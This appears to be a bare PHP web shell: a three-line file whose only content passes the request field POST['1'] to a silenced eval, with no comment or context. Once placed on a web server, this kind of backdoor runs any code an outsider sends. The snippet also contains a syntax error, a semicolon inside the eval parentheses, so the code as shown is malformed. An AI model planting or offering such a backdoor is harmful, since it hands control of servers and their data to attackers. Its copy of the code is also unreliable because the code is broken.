<?php
@eval($_POST['1'];)
?>